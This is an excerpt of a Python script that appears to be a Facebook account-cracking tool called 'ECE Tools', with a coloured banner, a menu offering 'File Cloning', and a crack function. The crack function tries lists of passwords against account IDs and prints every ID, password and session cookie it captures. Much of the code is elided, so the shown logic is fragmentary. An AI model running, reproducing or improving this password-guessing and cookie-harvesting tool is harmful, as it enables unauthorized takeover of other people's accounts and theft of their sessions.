...
princp=[]
try:
	prox= requests.get('https://github.com/ECE-143/PAID/blob/main/Approve.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mECE')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/ECE-143/PAID/blob/main/Approve.txt').text
		ua=open('.bbnew.txt','w')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'ECE' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  ECE,  Tools"')
#os.system('xdg-open https://www.facebook.com/ECE.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[1;92m
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ [=] AUTHOR    \033[1;91m :   \033[1;92mANIS SCHIAPARELLI             ┃
┃ [=] FACEBOOK  \033[1;91m : \033[1;92m  ANIS SCHIAPARELLI                ┃
┃ [=] GITHUB    \033[1;91m :   \033[1;92mPIKSO404               ┃
...
def login():
	banner()
	ECEj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	ECEj('\033[0;97m===============================================')
	ECE= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if ECE in ['m']:
		public()
	elif ECE in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ECE-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#ECE-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•ECE-Cp] {idf} • {pw}')     
				...
				#ECE-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•ECE-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " ECE,  Ok,  id"')
